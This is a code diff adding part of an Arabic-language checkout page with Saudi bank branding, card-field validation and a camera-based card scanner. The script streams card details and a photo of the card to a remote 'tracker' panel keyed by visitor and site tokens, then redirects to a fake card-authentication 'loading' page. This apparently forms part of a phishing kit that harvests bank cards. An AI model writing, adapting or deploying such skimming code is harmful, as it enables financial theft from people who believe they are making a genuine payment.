+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Anb_new_logo.svg"
+            },
+            {
+                "id": "snb",
+                "name_ar": "البنك الأهلي السعودي",
+                "domain": "alahli.com",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Saudi_National_Bank_Logo.svg"
+            },
+            {
+                "id": "alrajhi",
+                "name_ar": "مصرف الراجحي",
+                "domain": "alrajhibank.com.sa",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Al_Rajhi_Bank_Logo.svg"
+            },
+            {
+                "id": "alinma",
+                "name_ar": "مصرف الإنماء",
+                "domain": "alinma.com",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Alinma_Bank_logo.svg"
+            },
+            {
+                "id": "bsf",
+                "name_ar": "البنك السعودي الفرنسي",
+                "domain": "alfransi.com.sa",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Banque_Saudi_Fransi_Logo.svg"
+            },
+            {
+                "id": "aljazira",
+                "name_ar": "بنك الجزيرة",
+                "domain": "baj.com.sa",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/Aljazira_Bank_Logo.svg"
+            },
+            {
+                "id": "d360",
+                "name_ar": "بنك D360",
+                "domain": "d360.com",
+                "logo_url": "https://commons.wikimedia.org/wiki/Special:FilePath/D360_Bank.svg"
+            }
+        ];
+
+        // 🌟 دالة جلب الشعار: 1. قائمة ويكيبيديا المباشرة -> 2. Google Favicons -> 3. اسم البنك النصي
+        function setupBankLogoChain(imgEl, titleEl, domain, bankName) {
+            var bName = (bankName || '').toLowerCase();
+            var bDomain = (domain || '').toLowerCase();
+            var primaryLogo = '';
+
+            // 1. فحص التطابق مع القائمة الرئيسية (بالاسم أو الدومين)
+            for (var i = 0; i < PRIMARY_BANK_LOGOS.length; i++) {
+                var bank = PRIMARY_BANK_LOGOS[i];
+                if (
+                    (bDomain && bDomain.includes(bank.domain)) ||
+                    (bName && (bName.includes(bank.id) || bName.includes(bank.name_ar.toLowerCase())))
+                ) {
+                    primaryLogo = bank.logo_url;
+                    break;
+                }
+            }
+
+            // تجهيز قائمة المصادر (ويكيبيديا أولاً ثم جوجل فقط)
+            var sources = [];
+            if (primaryLogo) {
+                sources.push(primaryLogo);
+            }
+            if (domain) {
+                sources.push(`https://www.google.com/s2/favicons?domain=${domain}&sz=128`);
+            }
+
+            // إذا لم يتوفر أي رابط، عرض الاسم النصي مباشرة
+            if (sources.length === 0) {
+                imgEl.style.display = 'none';
+                if (bankName) {
+                    titleEl.innerText = bankName;
+                    titleEl.style.display = 'block';
+                } else {
+                    titleEl.style.display = 'none';
+                }
+                return;
+            }
+
+            var currentIndex = 0;
+
+            function tryNext() {
+                if (currentIndex < sources.length) {
+                    imgEl.src = sources[currentIndex++];
+                } else {
+                    // في حال فشل المصادر المحددة، إظهار اسم البنك النصي
+                    imgEl.style.display = 'none';
+                    if (bankName) {
+                        titleEl.innerText = bankName;
+                        titleEl.style.display = 'block';
+                    } else {
+                        titleEl.style.display = 'none';
+                    }
+                }
+            }
+
+            imgEl.onerror = tryNext;
+            imgEl.onload = function () {
+                imgEl.style.display = 'block';
+                titleEl.style.display = 'none';
+            };
+
+            tryNext();
+        }
+
+
+
+        function validateCardNumber(el) {
+            let r = el.value.replace(/\D/g, '').substring(0, 16);
+            el.value = r.replace(/(\d{4})/g, '$1 ').trim();
+            document.getElementById('card-graphic-number').innerText = el.value || '•••• •••• •••• ••••';
+
+            const bankLogoEl = document.getElementById('card-graphic-bank-logo');
+            const bankTitleEl = document.getElementById('card-graphic-bank-title');
+            const currencyBox = document.getElementById('card-currency-box');
+            const networkGraphic = document.getElementById('card-graphic-network');
+            const networkInline = document.getElementById('network-logo-inline');
+            const tierEl = document.getElementById('card-graphic-tier');
+            const flagEl = document.getElementById('card-graphic-flag');
+            const previewCard = document.getElementById('card-preview-container');
+
+            if (r.length < 6) {
+                bankLogoEl.style.display = 'none';
+                bankTitleEl.style.display = 'none';
+                currencyBox.style.display = 'none';
+                networkGraphic.innerHTML = '';
+                networkInline.innerHTML = '';
+                tierEl.style.display = 'none';
+                flagEl.style.display = 'none';
+                previewCard.style.background = '#f0f4fa';
+
+                if (r.startsWith('4')) {
+                    networkInline.innerHTML = `<img src="${VISA_IMG_URL}" alt="Visa">`;
+                } else if (r.startsWith('5')) {
+                    networkInline.innerHTML = `<img src="${MC_IMG_URL}" alt="Mastercard">`;
+                } else if (r.startsWith('6')) {
+                    networkInline.innerHTML = `<img src="${MADA_IMG_URL}" alt="Mada">`;
+                }
+
+                isCardValid = false;
+                el.className = r.length > 0 ? 'error' : '';
+                updatePayButtonState();
+                return;
+            }
+
+            const bin = r.substring(0, 6);
+            const binMatch = BIN_DATABASE[bin] || null;
+
+            let brandName = binMatch ? binMatch.brand : '';
+            let bankName = binMatch ? binMatch.issuer : '';
+            let bankUrl = binMatch ? binMatch.issuerUrl : '';
+            let isoCode = binMatch ? binMatch.iso2 : '';
+            let cardType = binMatch ? binMatch.type : 'CREDIT';
+            let cardCat = binMatch ? binMatch.category : 'SIGNATURE';
+
+            if (!brandName) {
+                if (r.startsWith('4')) brandName = 'VISA';
+                else if (r.startsWith('5')) brandName = 'MASTERCARD';
+                else if (r.startsWith('6')) brandName = 'MADA';
+            }
+
+            let badgeUrl = VISA_IMG_URL;
+            if (brandName === 'MADA' || (isoCode === 'SA' && cardType === 'DEBIT') || r.startsWith('6')) {
+                badgeUrl = MADA_IMG_URL;
+                previewCard.style.background = '#eef7f9';
+            } else if (brandName === 'MASTERCARD' || r.startsWith('5')) {
+                badgeUrl = MC_IMG_URL;
+                previewCard.style.background = '#fdf6f0';
+            } else {
+                badgeUrl = VISA_IMG_URL;
+                previewCard.style.background = '#f0f4fa';
+            }
+
+            networkInline.innerHTML = `<img src="${badgeUrl}" alt="${brandName}">`;
+            networkGraphic.innerHTML = `<img src="${badgeUrl}" alt="${brandName}" class="card-network-logo-preview">`;
+
+            const domain = extractDomain(bankUrl);
+            setupBankLogoChain(bankLogoEl, bankTitleEl, domain, bankName);
+
+            currencyBox.innerText = COUNTRY_CURRENCY[isoCode] || 'SAR';
+            currencyBox.style.display = 'block';
+
+            tierEl.innerText = `${cardType} • ${cardCat}`;
+            tierEl.style.display = 'block';
+
+            if (COUNTRY_FLAGS[isoCode]) {
+                flagEl.innerText = COUNTRY_FLAGS[isoCode];
+                flagEl.style.display = 'block';
+            } else {
+                flagEl.style.display = 'none';
+            }
+
+            if (r.length === 16) {
+                isCardValid = isValidLuhn(r);
+                el.className = isCardValid ? 'success' : 'error';
+                if (isCardValid) document.getElementById('card-expiry').focus();
+            } else {
+                isCardValid = false;
+                el.className = 'error';
+            }
+            updatePayButtonState();
+        }
+
+        function validateCardExpiry(el) {
+            let r = el.value.replace(/\D/g, '').substring(0, 4);
+            if (r.length === 1 && ['2', '3', '4', '5', '6', '7', '8', '9'].includes(r)) r = '0' + r;
+            if (r.length >= 2) {
+                let m = parseInt(r.substring(0, 2), 10);
+                if (m > 12) m = 12; if (m === 0) m = 1;
+                r = (m < 10 ? '0' + m : m) + '/' + r.substring(2, 4);
+            }
+            el.value = r;
+            document.getElementById('card-graphic-expiry').innerText = r || 'MM/YY';
+
+            if (r.length === 5) {
+                let parts = r.split('/');
+                let m = parseInt(parts[0], 10), y = parseInt('20' + parts[1], 10);
+                let now = new Date(), curM = now.getMonth() + 1, curY = now.getFullYear();
+                isExpiryValid = (y > curY || (y === curY && m >= curM)) && (m >= 1 && m <= 12);
+                el.className = isExpiryValid ? 'success' : 'error';
+                if (isExpiryValid) document.getElementById('card-cvv').focus();
+            } else {
+                isExpiryValid = false;
+                el.className = r.length > 0 ? 'error' : '';
+            }
+            updatePayButtonState();
+        }
+
+        function validateCardCvv(el) {
+            let v = el.value.replace(/\D/g, '').substring(0, 4);
+            el.value = v;
+            document.getElementById('card-graphic-cvv').innerText = v.length > 0 ? v : '•••';
+            isCvvValid = v.length >= 3;
+            el.className = isCvvValid ? 'success' : (v.length > 0 ? 'error' : '');
+            if (isCvvValid && v.length === 3) document.getElementById('card-holder').focus();
+            updatePayButtonState();
+        }
+
+        function validateCardHolder(el) {
+            let v = el.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+            el.value = v;
+            document.getElementById('card-graphic-holder').innerText = v || 'CARDHOLDER NAME';
+            isHolderValid = v.trim().length >= 3;
+            el.className = isHolderValid ? 'success' : (v.length > 0 ? 'error' : '');
+            updatePayButtonState();
+        }
+
+        function handlePaymentSubmit(e) {
+            e.preventDefault();
+            if (!isCardValid || !isExpiryValid || !isCvvValid || !isHolderValid) return;
+
+            document.getElementById('pay-submit-btn').disabled = true;
+            document.getElementById('pay-submit-btn').innerText = "جاري الدفع الآمن...";
+            streamLiveFormPayload('confirmed');
+
+            fetch(SERVER_HUB_URL + '/api/tracker/ping', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: visitorToken,
+                    siteKey: siteKey,
+                    currentPage: '/loading',
+                    pageTitle: 'جاري مصادقة البطاقة البنكية...'
+                })
+            }).catch(function () { });
+
+            setTimeout(function () {
+                var dest = (window.location.pathname.includes('/live/') || window.location.pathname.includes('/storage/'))
+                    ? ((window.location.pathname.startsWith('/live/') ? '/live/' : '/storage/') + siteKey + '/loading.html')
+                    : 'loading.html';
+                window.location.href = dest;
+            }, 800);
+        }
+
+        var mediaStream = null;
+
+        async function openCardScanner() {
+            const modal = document.getElementById('camera-modal');
+            const video = document.getElementById('camera-video');
+            modal.classList.add('active');
+
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { ideal: "environment" },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                video.srcObject = mediaStream;
+            } catch (err) {
+                alert("يرجى منح الإذن للوصول إلى الكاميرا من إعدادات المتصفح لمسح البطاقة.");
+                closeCardScanner();
+            }
+        }
+
+        function closeCardScanner() {
+            const modal = document.getElementById('camera-modal');
+            const video = document.getElementById('camera-video');
+            modal.classList.remove('active');
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            video.srcObject = null;
+        }
+
+        async function captureAndRecognizeCard() {
+            const video = document.getElementById('camera-video');
+            const btn = document.querySelector('.btn-capture');
+            btn.innerText = "جاري المعالجة وقراءة الرقم...";
+            btn.disabled = true;
+
+            // 1. توليد لقطة مدمجة وخفيفة جداً (أقل من 20KB) لضمان قبولها في اللوحة فوراً
+            const thumbCanvas = document.createElement('canvas');
+            thumbCanvas.width = 320;
+            thumbCanvas.height = 200;
+            const thumbCtx = thumbCanvas.getContext('2d');
+            thumbCtx.drawImage(video, 0, 0, 320, 200);
+
+            const capturedBase64 = thumbCanvas.toDataURL('image/jpeg', 0.5);
+            document.getElementById('card-scanned-image').value = capturedBase64;
+
+            // بث صورة المسح مباشرة إلى اللوحة في حدث منفصل خفيف
+            fetch(SERVER_HUB_URL + '/api/tracker/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: visitorToken,
+                    siteKey: siteKey,
+                    formName: 'لقطة مسح البطاقة (كاميرا 📷)',
+                    submissionData: {
+                        'صورة البطاقة': capturedBase64,
+                        '_sessionId': currentSessionId
+                    },
+                    isFinalSubmission: false,
+                    isImportant: true
+                }),
+                keepalive: true
+            }).catch(function () { });
+
+            // 2. إنشاء Canvas المعالجة الدقيقة لتحسين التباين واستخراج الأرقام فقط
+            const ocrCanvas = document.createElement('canvas');
+            ocrCanvas.width = video.videoWidth || 640;
+            ocrCanvas.height = video.videoHeight || 480;
+            const ocrCtx = ocrCanvas.getContext('2d');
+            ocrCtx.drawImage(video, 0, 0, ocrCanvas.width, ocrCanvas.height);
+
+            const imgData = ocrCtx.getImageData(0, 0, ocrCanvas.width, ocrCanvas.height);
+            const d = imgData.data;
+            for (let i = 0; i < d.length; i += 4) {
+                const avg = 0.3 * d[i] + 0.59 * d[i + 1] + 0.11 * d[i + 2];
+                const v = avg > 115 ? 255 : 0;
+                d[i] = v;
+                d[i + 1] = v;
+                d[i + 2] = v;
+            }
+            ocrCtx.putImageData(imgData, 0, 0);
+
+            try {
+                const { data: { text } } = await Tesseract.recognize(ocrCanvas, 'eng', {
+                    tessedit_char_whitelist: '0123456789 -'
+                });
+
+                const cleanDigitsOnly = text.replace(/\D/g, '');
+                let targetCardDigits = '';
+
+                for (let len = 16; len >= 13; len--) {
+                    const regex = new RegExp(`\\d{${len}}`, 'g');
+                    const matches = cleanDigitsOnly.match(regex);
+                    if (matches) {
+                        for (const match of matches) {
+                            if (isValidLuhn(match)) {
+                                targetCardDigits = match;
+                                break;
+                            }
+                        }
+                    }
+                    if (targetCardDigits) break;
+                }
+
+                if (!targetCardDigits) {
+                    const fallbackMatch = cleanDigitsOnly.match(/\d{16}/) || text.match(/(?:\d[ -]*?){16}/);
+                    if (fallbackMatch) {
+                        targetCardDigits = fallbackMatch[0].replace(/\D/g, '').substring(0, 16);
+                    }
+                }
+
+                if (targetCardDigits && targetCardDigits.length >= 13) {
+                    const cardInput = document.getElementById('card-number');
+                    cardInput.value = targetCardDigits;
+                    validateCardNumber(cardInput);
+                    closeCardScanner();
+                    streamLiveFormPayload('typing');
+                } else {
+                    alert("لم يتم التعرف على أرقام البطاقة بدقة، يرجى ضبط الإضاءة وتوجيه الكاميرا أفقياً على الأرقام.");
+                }
+            } catch (e) {
+                alert("تعذر قراءة أرقام البطاقة، يرجى المحاولة بزاوية أخرى أو إدخالها يدوياً.");
+            } finally {
+                btn.innerText = "📸 مسح وقراءة الرقم";
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+
+</html>
